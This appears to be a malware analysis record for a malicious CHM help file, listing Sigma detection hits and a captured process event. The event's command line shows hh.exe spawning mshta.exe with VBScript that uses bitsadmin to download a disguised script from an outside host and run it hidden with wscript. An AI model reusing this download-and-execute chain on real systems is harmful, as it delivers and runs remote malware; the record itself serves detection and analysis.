threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: HTML Help HH.EXE Suspicious Child Process
sigma_analysis_results.rule_description: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)

match_context.values: @{Hashes=MD5=0B4340ED812DC82CE636C00FA5C9BEF2,SHA256=DBA3137811C686FD35E418D76184070E031F207002649DA95385DFD05A8BB895,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Windows\hh.exe" "C:\Users\Bruno\AppData\Local\Temp\sample.chm"; CommandLine="C:\Windows\System32\mshta.exe" vbscript:Execute("Dim shell,command,command1:command = ""bitsadmin /transfer QQTrecent /download /priority normal http://www.businesshop.net/hide.gif C:\windows\temp\PowerOpt.vbs"":command1=""wscript C:\windows\temp\PowerOpt.vbs"":set shell = CreateObject(""WScript.Shell""):shell.Run command,0,true:shell.Run command1,0:close"); FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\hh.exe; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file
